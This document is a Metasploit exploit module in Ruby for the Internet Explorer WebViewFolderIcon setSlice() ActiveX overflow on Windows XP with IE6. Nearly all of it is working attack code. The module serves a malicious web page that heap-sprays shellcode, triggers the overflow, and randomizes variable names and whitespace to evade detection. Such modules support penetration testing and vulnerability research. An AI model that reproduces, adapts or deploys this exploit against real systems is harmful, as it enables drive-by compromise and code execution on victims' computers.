require 'msf/core'

module Msf

class Exploits::Windows::Browser::WebView_SetSlice < Msf::Exploit::Remote

	include Exploit::Remote::HttpServer::Html

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Internet Explorer WebViewFolderIcon setSlice() Overflow',
			'Description'    => %q{
				This module exploits a flaw in the WebViewFolderIcon ActiveX control
			included with Windows 2000, Windows XP, and Windows 2003. This flaw was published
			during the Month of Browser Bugs project (MoBB #18).
			},
			'License'        => MSF_LICENSE,
			'Author'         => 
				[ 
					'hdm', 
				],
			'Version'        => '$Revision: 3783 $',
			'References'     => 
				[
					[ 'OSVDB', '27110' ],
					[ 'BID', '19030' ],
					[ 'URL', 'http://browserfun.blogspot.com/2006/07/mobb-18-webviewfoldericon-setslice.html' ]
				],
			'Payload'        =>
				{
					'Space'          => 1024,
					'BadChars'       => "\x00",
	
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows XP SP0-SP2 / IE 6.0SP1 English', {'Ret' => 0x0c0c0c0c} ]
				],
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end
	
	def on_request_uri(cli, request)

		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))
		
		# Get a unicode friendly version of the return address
		addr_word  = [target.ret].pack('V').unpack('H*')[0][0,4]

		# Randomize the javascript variable names	
		var_buffer    = Rex::Text.rand_text_alpha(rand(30)+2)
		var_shellcode = Rex::Text.rand_text_alpha(rand(30)+2)
		var_unescape  = Rex::Text.rand_text_alpha(rand(30)+2)
		var_x         = Rex::Text.rand_text_alpha(rand(30)+2)
		var_i         = Rex::Text.rand_text_alpha(rand(30)+2)
		var_tic       = Rex::Text.rand_text_alpha(rand(30)+2)
		var_toc       = Rex::Text.rand_text_alpha(rand(30)+2)
		
		# Randomize HTML data
		html          = Rex::Text.rand_text_alpha(rand(30)+2)
		
		# Build out the message
		content = %Q|
<html>
<head>
	<script>
	try {
	
	var #{var_unescape}  = unescape ;
	var #{var_shellcode} = #{var_unescape}( "#{shellcode}" ) ;
	
	var #{var_buffer} = #{var_unescape}( "%u#{addr_word}" ) ;
	while (#{var_buffer}.length <= 0x400000) #{var_buffer}+=#{var_buffer} ;

	var #{var_x} = new Array() ;	
	for ( var #{var_i} =0 ; #{var_i} < 30 ; #{var_i}++ ) {
		#{var_x}[ #{var_i} ] = 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} +
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} + 		
			#{var_buffer}.substring( 0 ,  0x100000 - #{var_shellcode}.length ) + #{var_shellcode} ;
	}
	
	
   	for ( var #{var_i} = 0 ; #{var_i} < 1024 ; #{var_i}++) {
		var #{var_tic} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' );	
		try { #{var_tic}.setSlice( 0x7ffffffe , 0 , 0 , #{target.ret} ) ; } catch( e ) { }
		var #{var_toc} = new ActiveXObject( 'WebViewFolderIcon.WebViewFolderIcon.1' );
	}
	
	} catch( e ) { window.location = 'about:blank' ; }
	
	</script>
</head>
<body>
#{html}
</body>
</html>		
		|

		# Randomize the whitespace in the document
		content.gsub!(/\s+/) do |s|
			len = rand(100)+2
			set = "\x09\x20\x0d\x0a"
			buf = ''
			
			while (buf.length < len)
				buf << set[rand(set.length)].chr
			end
			
			buf
		end
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, content)
	end

end

end
